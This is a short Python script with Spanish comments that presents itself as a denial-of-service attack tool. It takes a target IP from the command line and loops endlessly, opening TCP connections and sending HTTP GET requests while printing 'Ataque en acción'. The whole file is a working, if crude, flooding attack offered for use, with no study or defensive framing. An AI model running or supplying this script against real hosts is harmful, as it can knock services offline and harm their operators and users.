import sys
import socket

def dos_attack(target_host, target_port=80):
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((target_host, target_port))
            # Convertir la cadena a bytes antes de enviar
            request = "GET / HTTP/1.1\r\nHost: " + target_host + "\r\n\r\n"
            client.send(request.encode())  # .encode() convierte la cadena a bytes
            client.close()
            print("Ataque en acción")
        except Exception as e:
            print("Error durante el ataque: ", str(e))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python3 programa.py <dirección_ip>")
        sys.exit(1)

    target_host = sys.argv[1]  # Dirección IP pasada como argumento
    dos_attack(target_host)
